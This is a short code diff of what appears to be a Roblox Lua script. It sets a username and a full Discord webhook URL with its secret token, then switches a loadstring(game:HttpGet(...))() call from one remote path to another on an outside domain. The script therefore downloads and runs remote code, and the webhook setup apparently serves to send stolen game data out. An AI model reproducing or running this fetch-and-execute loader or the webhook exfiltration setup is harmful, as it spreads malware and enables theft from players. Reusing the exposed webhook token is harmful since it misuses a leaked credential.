@@ -1,4 +1,4 @@
 Username = "ZeatForGun"
 Webhook = "https://discord.com/api/webhooks/1262569690014814239/ik4_ZD0NtiTZiUEJg_1A1hurGsksmDf5GRzai11sVUXjtUjnJoIbA4mHG48r8IHcBNEh"
 
-loadstring(game:HttpGet("https://egorikusa.space/adopt"))()
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
